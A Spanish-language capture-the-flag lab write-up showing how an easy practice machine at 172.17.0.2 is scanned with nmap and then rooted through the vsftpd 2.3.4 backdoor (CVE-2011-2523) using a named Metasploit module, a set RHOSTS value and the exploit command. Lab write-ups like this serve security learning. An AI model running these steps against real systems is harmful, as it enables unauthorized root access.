tags: #muy-facil #backdoor #vsftpd #metasploit
______________________________
Empezamos la máquina haciendo un reconocimiento básico de puertos:

```bash
map -sS -p- 172.17.0.2 -n -Pn -vvv --open --min-rate 2000 -oN ports
```

![Pasted image 20251008171854](Hacking-repo-obs/Anexos/Pasted%20image%2020251008171854.png)

Al solo tener un puerto abierto, el 21, vamos a ejecutar unos scripts básicos para conocer la versión del servicio y también lanzar unos scripts básicos de vulnerabilidades:

```bash
nmap -sVC -p21 -oN versions -vvv 172.17.0.2
```

![Pasted image 20251008172345](Hacking-repo-obs/Anexos/Pasted%20image%2020251008172345.png)

```bash
nmap --script vuln 172.17.0.2 -vvv -oN vuln
```

![Pasted image 20251008172221](Hacking-repo-obs/Anexos/Pasted%20image%2020251008172221.png)

Aquí vemos que por el puerto 21 corre un servicio vsftpd 2.3.4, y que nos reporta una vulnerabilidad con backdoor, mas concretamente la **CVE-2011-2523**.
Hacemos una búsqueda en searchsploit para ver como podemos explotarla:

![Pasted image 20251008172615](Hacking-repo-obs/Anexos/Pasted%20image%2020251008172615.png)

Vamos a utilizar metasploit para acceder, así que abrimos la consola y ejecutamos el siguiente comando:
```bash
search vsftpd 2.3.4
```

Y después, copiamos la ruta del exploit y la pegamos usando el siguiente comando:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

Luego ejecutamos el siguiente comando para mostrar las opciones:

```bash
show options
```

Y obtenemos lo siguiente:

![Pasted image 20251008175502](Hacking-repo-obs/Anexos/Pasted%20image%2020251008175502.png)

Ahora, vemos que tenemos que cubrir el parámetro RHOSTS, así que lo seteamos con el comando:

```bash
set RHOSTS 172.17.0.2
```

Luego volvemos a comprobar con **show options** y comprobamos que ya tenemos todo bien cumplimentado y ejecutamos, por último el siguiente comando:

```bash
exploit
```

![Pasted image 20251008175803](Hacking-repo-obs/Anexos/Pasted%20image%2020251008175803.png)

Vemos que nos ha encontrado una shell, así que ejecutamos **whoami** y... root!!

![Pasted image 20251008180001](Hacking-repo-obs/Anexos/Pasted%20image%2020251008180001.png)
